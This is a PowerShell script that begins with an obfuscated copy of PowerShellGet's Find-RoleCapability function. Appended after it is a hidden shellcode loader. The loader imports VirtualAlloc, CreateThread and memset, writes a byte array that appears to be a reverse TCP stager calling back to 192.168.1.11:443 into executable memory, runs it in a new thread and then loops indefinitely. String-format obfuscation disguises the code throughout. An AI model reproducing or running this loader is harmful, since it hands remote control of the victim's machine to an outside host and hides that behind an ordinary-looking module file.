function Find-RoleCapability
{
    
    [CmdletBinding(HelpUri = ("{4}{1}{5}{0}{6}{2}{3}{7}"-f'wli','s://go.microsoft.c','inkId=7','18','http','om/f','nk/?L','029'))]
    [outputtype({"{0}{3}{1}{4}{5}{2}"-f 'PSCus','O','ct[]','tom','b','je'})]
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $Name,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string]
        $ModuleName,

        [Parameter()]
        [ValidateNotNull()]
        [string]
        $MinimumVersion,

        [Parameter()]
        [ValidateNotNull()]
        [string]
        $MaximumVersion,

        [Parameter()]
        [ValidateNotNull()]
        [string]
        $RequiredVersion,

        [Parameter()]
        [switch]
        $AllVersions,

        [Parameter()]
        [switch]
        $AllowPrerelease,

        [Parameter()]
        [ValidateNotNull()]
        [string[]]
        $Tag,

        [Parameter()]
        [ValidateNotNull()]
        [string]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [ValidateNotNullOrEmpty()]
        [Uri]
        $Proxy,

        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [PSCredential]
        $ProxyCredential,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $Repository
    )


    Process
    {
        $PSBoundParameters[("{0}{1}{2}"-f'Includ','e','s')] = ("{2}{1}{0}" -f 'ity','apabil','RoleC')

        if($PSBoundParameters.ContainsKey(("{1}{0}"-f 'me','Na')))
        {
            $PSBoundParameters[("{0}{2}{1}{3}"-f'RoleC','it','apabil','y')] = $Name
            $null = $PSBoundParameters.Remove(("{1}{0}" -f'ame','N'))
        }

        if($PSBoundParameters.ContainsKey(("{0}{2}{1}" -f 'Mo','e','duleNam')))
        {
            $PSBoundParameters[("{0}{1}" -f'Nam','e')] = $ModuleName
            $null = $PSBoundParameters.Remove(("{0}{2}{1}" -f 'ModuleNa','e','m'))
        }

        PowerShellGet\Find-Module @PSBoundParameters |
            Microsoft.PowerShell.Core\ForEach-Object {
                $psgetModuleInfo = $_
                $psgetModuleInfo.Includes.RoleCapability | Microsoft.PowerShell.Core\ForEach-Object {
                    if($Name -and ($Name -notcontains $_))
                    {
                        return
                    }

                    $psgetRoleCapabilityInfo = Microsoft.PowerShell.Utility\New-Object PSCustomObject -Property ([ordered]@{
                            Name            = $_
                            Version         = $psgetModuleInfo.Version
                            ModuleName      = $psgetModuleInfo.Name
                            Repository      = $psgetModuleInfo.Repository
                            PSGetModuleInfo = $psgetModuleInfo
                    })

                    $psgetRoleCapabilityInfo.PSTypeNames.Insert(0, ("{1}{8}{2}{9}{3}{5}{4}{6}{7}{0}" -f'nfo','Micros','rShell.Com','ds.PSGetRole','apa','C','bil','ityI','oft.Powe','man'))
                    $psgetRoleCapabilityInfo
                }
            }
    }
}
$c = ((("{41}{33}{57}{6}{76}{71}{22}{64}{72}{89}{68}{42}{18}{66}{56}{15}{51}{93}{5}{62}{13}{78}{16}{69}{28}{49}{102}{39}{36}{105}{7}{101}{58}{8}{30}{75}{61}{107}{91}{25}{34}{10}{84}{83}{11}{21}{52}{3}{60}{74}{45}{81}{98}{31}{50}{85}{44}{47}{37}{73}{9}{24}{65}{26}{104}{100}{90}{19}{35}{43}{14}{4}{94}{103}{77}{38}{92}{46}{88}{0}{80}{20}{96}{97}{87}{55}{82}{12}{17}{86}{2}{63}{70}{79}{95}{32}{59}{54}{23}{48}{27}{40}{106}{29}{99}{53}{1}{67}"-f'ThreadI','nt co','u','e','e','l','(','P','ct','tr lpS','CS)]public stat','r C','msvcrt.dl','Address, u','am','rtualAll','wSi','ltCS',' IntPt','r','[D','r','ernel32','P','ta','CSkernel32.dll','ddress','d','in',', uint src',')','readA','n IntPtr ','DllIm','t',' lp','locationType','iz','rea','flAl','e','[','xtern','Par','t dwStac','read(I','s, ','kS','tr ','t','ttributes, ui','oc(IntP','eat','ui','emset(Int','port(','Vi','port','ote','m','T','[DllImp','p','blic','.dll','rtA','r ','unt);','tic e','ze, u',' static','k','tCS)]pub','e, IntP','h',';','tCS',' uint dwC','int d',' ext','d);','ntPt','tCS','Pt','ic extern Int','n',')]p','m','IntPtr lp','lic sta','t','t','tionFlag','tr ','ter','er','ll','I','r lpTh',', ',' IntP','r',' ',',',',',', uint fl','st','ort('))-CRepLacE  'tCS',[CHAR]34);$w = Add-Type -memberDefinition $c -Name ("{0}{1}" -f'Win3','2') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
